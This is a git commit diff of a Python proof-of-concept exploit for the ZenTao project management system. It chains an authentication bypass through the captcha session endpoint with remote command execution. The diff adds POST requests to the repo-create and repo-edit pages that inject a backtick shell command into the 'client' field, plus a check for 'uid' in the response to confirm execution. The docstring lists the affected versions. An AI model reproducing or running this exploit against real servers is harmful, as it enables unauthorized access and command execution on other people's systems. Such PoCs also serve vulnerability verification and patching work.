a1ed5bec7c4ab3037358c0f03ebf7281d010605f
webraybtl <95903558+webraybtl@users.noreply.github.com>
2023-01-12 22:09:42 +0800

    Update and rename poc_bypass.py to poc_bypass_rce.py

--- poc_bypass_rce.py
+++ poc_bypass_rce.py
@@ -2,8 +2,7 @@
 # !/usr/bin/python
 
 '''
-权限绕过POC
-
+权限绕过+RCE POC 伪静态传参版
 禅道系统 影响版本 安全版本
 开源版 17.4以下的未知版本<=version<=18.0.beta1 18.0.beta2
 旗舰版 3.4以下的未知版本<=version<=4.0.beta1 4.0.beta2
@@ -17,18 +16,24 @@ proxies = {
 }
 def check(url):
     # url="http://10.211.55.3:8008"
-    url1 = url+'/index.php?m=misc&f=captcha&sessionVar=user'
-    url2 = url+'/index.php?m=block&f=printBlock&id=1&module=my'
+    url1 = url+'/misc-captcha-user.html'
+    # url2 = url+'/index.php?m=block&f=printBlock&id=1&module=my'#非伪静态版本按照此格式传参
+    url3 = url + '/repo-create.html'
+    url4 = url + '/repo-edit-10000-10000.html'
     headers={
         "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
         "Accept-Language":"zh-CN,zh;q=0.9",
         "Cookie":"zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default",
     }
+    data1 = 'product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=%60id%60&account=&password=&encrypt=base64&desc=&uid=63c00e3d20873'
+    data2 = 'SCM=Subversion&client=`id`'
     s=requests.session()
     try:
         req1 = s.get(url1,proxies=proxies,timeout=5,verify=False,headers=headers)
-        req1 = s.get(url2,proxies=proxies,timeout=5,verify=False,headers=headers)
-        if 'left-today' in req1.text:
+        # req1 = s.get(url2,proxies=proxies,timeout=5,verify=False,headers=headers)
+        req3 = s.post(url3,data=data1,proxies=proxies,timeout=5,verify=False,headers=headers)
+        req4 = s.post(url4,data=data2,proxies=proxies,timeout=5,verify=False,headers=headers)
+        if 'uid' in req4.text:
             print(url,"")
             return True
     except Exception as e:
